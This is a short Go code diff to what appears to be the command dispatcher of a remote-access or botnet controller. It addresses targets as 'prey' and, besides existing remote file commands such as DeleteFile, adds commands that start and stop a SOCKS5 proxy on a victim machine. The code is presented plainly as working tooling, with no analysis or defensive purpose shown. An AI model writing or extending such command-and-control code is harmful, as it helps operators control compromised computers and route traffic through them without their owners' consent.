@@ -70,12 +70,12 @@ func (cd *CommandDispatcher) SendFileCommand(preyID, action string, params map[s
 	for k, v := range params {
 		cmd[k] = v
 	}
-	
+
 	cmdJSON, err := json.Marshal(cmd)
 	if err != nil {
 		return "", fmt.Errorf("failed to marshal command: %w", err)
 	}
-	
+
 	return cd.SendCommand(preyID, string(cmdJSON))
 }
 
@@ -109,3 +109,14 @@ func (cd *CommandDispatcher) DeleteFile(preyID, path string) (string, error) {
 	})
 }
 
+func (cd *CommandDispatcher) StartSocks5(preyID string, localAddr string) (string, error) {
+	params := map[string]interface{}{}
+	if localAddr != "" {
+		params["local_addr"] = localAddr
+	}
+	return cd.SendFileCommand(preyID, "start_socks5", params)
+}
+
+func (cd *CommandDispatcher) StopSocks5(preyID string) (string, error) {
+	return cd.SendFileCommand(preyID, "stop_socks5", nil)
+}
